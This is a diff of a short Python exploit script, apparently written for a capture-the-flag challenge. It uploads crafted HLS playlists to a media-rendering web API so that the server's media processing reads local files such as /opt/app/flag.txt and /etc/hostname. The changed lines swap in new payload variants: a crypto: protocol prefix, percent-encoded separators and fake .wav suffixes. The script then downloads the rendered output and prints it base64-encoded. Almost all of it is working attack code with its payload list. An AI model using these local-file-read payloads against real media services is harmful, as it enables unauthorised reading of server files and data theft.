@@ -13,7 +13,7 @@ def up(o,s):
 def ren(o):
  st,b=req(o,'/api/render',json.dumps({'slug':'p','theme':'midnight'}).encode(),{'Content-Type':'application/json'},'POST');return json.loads(b)
 def pl(seg):return f'#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:2\n#EXTINF:2,\n{seg}\n#EXT-X-ENDLIST\n'
-for seg in ['file:///opt/app/flag.txt#x.wav','file:///opt/app/flag.txt?x.wav','file:/opt/app/flag.txt#x.wav','file:/opt/app/flag.txt?x.wav','/opt/app/flag.txt?x.wav','/opt/app/flag.txt#x.wav','http://127.0.0.1/opt/app/flag.txt#x.wav','file:///etc/hostname#x.wav']:
+for seg in ['crypto:file:///opt/app/flag.txt#x.wav','crypto:file:///opt/app/flag.txt?x.wav','crypto:/opt/app/flag.txt#x.wav','crypto:/opt/app/flag.txt?x.wav','crypto:file:///opt/app/flag.txt%23x.wav','file:///opt/app/flag.txt%3Fx.wav','file:///opt/app/flag.txt%23x.wav','file:///opt/app/flag.txt/.wav','file:///opt/app/flag.txt%2f.wav']:
  o=op();req(o,'/studio');up(o,pl(seg));j=ren(o); print('\n',seg,'OK',j.get('ok')); e=j.get('errors','');print('\n'.join(x for x in e.splitlines() if any(k in x for k in ['allowed','Failed','Error when','Input #0','Duration','Stream #0:0','No such','Protocol'])))
  if j.get('ok'):
   st,p=req(o,j['outputs'][0]['url']);print('PNG',len(p));print('B64_START');print(base64.b64encode(p).decode());print('B64_END')
